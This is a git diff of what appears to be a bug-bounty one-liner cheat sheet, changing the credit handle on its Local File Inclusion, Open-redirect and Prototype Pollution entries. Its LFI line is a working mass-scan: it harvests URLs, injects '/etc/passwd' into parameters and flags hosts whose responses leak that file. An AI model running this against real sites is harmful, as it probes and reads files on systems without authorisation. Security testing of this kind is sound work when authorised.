@@ -18,14 +18,14 @@ This section defines specific terms or placeholders that are used throughout one
 ---
 
 ### Local File Inclusion
-> @libralog
+> @SecuritySphinx
 
 
 ```bash
 gau -f HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -v -L --retry 3 --retry-delay 5 --retry-max-time 30 -s "%" 2>&1 | grep -q "root:x" && echo -e "\e[31mVULN! %\e[0m" || echo -e "\e[32mSAFE! %\e[0m"'
 ```
 ### Open-redirect
-> @libralog
+> @SecuritySphinx
 
 
 ```bash
@@ -34,7 +34,7 @@ export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25
 
 
 ### Prototype Pollution
-> @libralog
+> @SecuritySphinx
 
 
 ```bash
